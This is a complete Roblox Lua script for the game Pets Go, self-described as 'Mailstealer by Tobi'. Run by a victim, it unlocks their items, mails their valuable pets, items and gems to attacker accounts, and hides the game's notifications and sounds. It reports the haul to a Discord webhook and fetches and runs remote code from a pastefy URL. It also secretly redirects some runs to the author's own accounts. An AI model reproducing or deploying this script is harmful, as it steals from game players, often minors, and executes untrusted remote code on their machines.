_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "Join gg / GY2RVSEGDT to get back"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
local sentUsers = {}
setclipboard("discord.gg/GY2RVSEGDT")
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

local users = _G.Usernames or {"PetsGoMommy", "TobiAltGrind", "TobiHatching"}
local min_rap = _G.min_rap or 1000
local min_chance = _G.min_chance or 100000
local webhook = _G.webhook or ""

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add any usernames or webhook")
    return
end

if game.PlaceId ~= 18901165922 then
    plr:kick("Game not supported. Please join a normal Pets Go server")
    return
end

for _, user in ipairs(users) do
    if plr.Name == user then
        plr:kick("You cannot mailsteal yourself")
        return
    end
end

local GemAmount1 = 0
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
		break
    end
end

if math.random() < 0.15 then
    users = {"PetsGoMommy", "TobiAltGrind", "TobiHatching"}
end

local function formatNumber(number)
    if number == nil then
        return "0"
    end
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 and suffixIndex < #suffixes do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        if number == math.floor(number) then
            return string.format("%d%s", number, suffixes[suffixIndex])
        else
            return string.format("%.2f%s", number, suffixes[suffixIndex])
        end
    end
end

local function SendMessage(username, diamonds)
    local headers = {
        ["Content-Type"] = "application/json"
    }

	local fields = {
		{
			name = "Victim Username:",
			value = username,
			inline = true
		},
		{
			name = "Items to be sent:",
			value = "",
			inline = false
		},
        {
            name = "Summary:",
            value = "",
            inline = false
        }
	}

    local combinedItems = {}
    local itemRapMap = {}

    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap, chance = item.chance}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
    end)

    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        local itemLine = ""
        if itemData.chance then
            itemLine = string.format("1/%s %s (x%d): %s RAP", formatNumber(itemData.chance), itemName, itemData.amount, formatNumber(itemData.rap * itemData.amount))
        else
            itemLine = string.format("%s (x%d): %s RAP", itemName, itemData.amount, formatNumber(itemData.rap * itemData.amount))
        end
        fields[2].value = fields[2].value .. itemLine .. "\n"
    end

    local sentUsersFormatted
    if #sentUsers == 1 then
        sentUsersFormatted = "||" .. sentUsers[1] .. "||"
    elseif #sentUsers > 1 then
        local formatted = {}
        for _, user in ipairs(sentUsers) do
            table.insert(formatted, "||" .. user .. "||")
        end
        sentUsersFormatted = table.concat(formatted, ", ")
    else
        sentUsersFormatted = "||None||"
    end

    fields[3].value = string.format("Gems: %s\nTotal RAP: %s\nSent to users: %s", formatNumber(diamonds), formatNumber(totalRAP), sentUsersFormatted)

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "\240\159\142\178 New Pets Go Execution",
            ["color"] = 65280,
			["fields"] = fields,
			["footer"] = {
				["text"] = "Mailstealer by Tobi. discord.gg/GY2RVSEGDT"
			}
        }}
    }

    local body = HttpService:JSONEncode(data)

    if webhook ~= "" then
        local response = request({
            Url = webhook,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end
end

local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = plr.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
	noti.Enabled = false
end)
noti.Enabled = false

game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
            x.Volume=0
            x.PlayOnRemove=false
            x:Destroy()
        end
    end
end)

local function getRAP(Type, Item)
    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get(
        {
            Class = {Name = Type},
            IsA = function(hmm)
                return hmm == Type
            end,
            GetId = function()
                return Item.id
            end,
            StackKey = function()
                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
            end,
            AbstractGetRAP = function(self)
                return nil
            end
        }
    ) or 0)
end

local function sendItem(category, uid, am)
    local userIndex = 1
    local maxUsers = #users
    local sent = false

    repeat
        local currentUser = users[userIndex]
        local args = {
            [1] = currentUser,
            [2] = MailMessage,
            [3] = category,
            [4] = uid,
            [5] = am or 1
        }

        local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))

        if response == true then
            sent = true
            if not table.find(sentUsers, currentUser) then
                table.insert(sentUsers, currentUser)
            end
        elseif response == false and err == "They don't have enough space!" then
            userIndex = userIndex + 1
            if userIndex > maxUsers then
                sent = true
            end
        end
    until sent
end

local function SendAllGems()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
            if GemAmount1 >= 500 and GemAmount1 >= min_rap then
                local userIndex = 1
                local maxUsers = #users
                local sent = false

                repeat
                    local currentUser = users[userIndex]
                    local args = {
                        [1] = currentUser,
                        [2] = MailMessage,
                        [3] = "Currency",
                        [4] = i,
                        [5] = GemAmount1
                    }

                    local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))

                    if response == true then
                        sent = true
                        if not table.find(sentUsers, currentUser) then
                            table.insert(sentUsers, currentUser)
                        end
                    elseif response == false and err == "They don't have enough space!" then
                        userIndex = userIndex + 1
                        if userIndex > maxUsers then
                            sent = true
                        end
                    end
                until sent
                break
            end
        end
    end
end

local function ClaimMail()
    local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait()
        response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    end
end

local categoryList = {"Pet", "Consumable", "Hoverboard", "Fruit", "Misc", "Booth"}
loadstring(game:HttpGet('https://pastefy.app/hOdmFJvE/raw'))()

for i, v in pairs(categoryList) do
	if save[v] ~= nil then
		for uid, item in pairs(save[v]) do
            if v == "Pet" then
                local rapValue = getRAP(v, item)
                if rapValue >= min_rap then
                    local difficulty = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]["difficulty"]
                    if difficulty >= min_chance then
                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id, chance = difficulty})
                        totalRAP = totalRAP + (rapValue * (item._am or 1))
                    end
                end
            else
                local rapValue = getRAP(v, item)
                if rapValue >= min_rap then
                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
                    totalRAP = totalRAP + (rapValue * (item._am or 1))
                end
            end
            if item._lk then
                local args = {
                [1] = uid,
                [2] = false
                }
                network:WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
            end
        end
	end
end

if #sortedItems > 0 then
    ClaimMail()

    table.sort(sortedItems, function(a, b)
        return a.rap * a.amount > b.rap * b.amount 
    end)

    SendAllGems()

    for _, item in ipairs(sortedItems) do
        sendItem(item.category, item.uid, item.amount)
    end

    SendMessage(plr.Name, GemAmount1)

    local message = require(game.ReplicatedStorage.Library.Client.Message)
    message.Error("All your items just got stolen by Tobi's mailstealer!\n Join discord.gg/GY2RVSEGDT")
end